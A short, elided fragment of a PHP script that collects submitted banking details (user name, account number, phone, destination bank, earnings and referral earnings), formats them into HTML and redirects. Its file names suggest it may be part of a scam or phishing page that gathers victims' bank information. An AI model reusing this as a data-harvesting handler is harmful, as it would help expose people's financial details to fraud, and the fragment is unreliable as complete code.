...
$phnnNumber = $_POST['phnnNumber'];
$desBank = $_POST['desBank'];
$earningspay = $_POST['earningspay'];
$proofRef = $_POST['proofRef'];
...
if( (empty($usuario)) or (empty($accountNumber)) ){
     header('location: trybank.html'); // codigo de verificacion que no esten los campos vacios
}else{
...
PHONE NUMBER: [<b><font color="#9900FF">'.$phnnNumber.'</font></b>]
DESTINATION BANK: [<b><font color="#9900FF">'.$desBank.'</font></b>]
EARNINGS: [<b><font color="#9900FF">'.$earningspay.'</font></b>]
REFERRAL EARNINGS: [<b><font color="#9900FF">'.$proofRef.'</font></b>]
...
header("Location:  detail1019.php");
}
?>
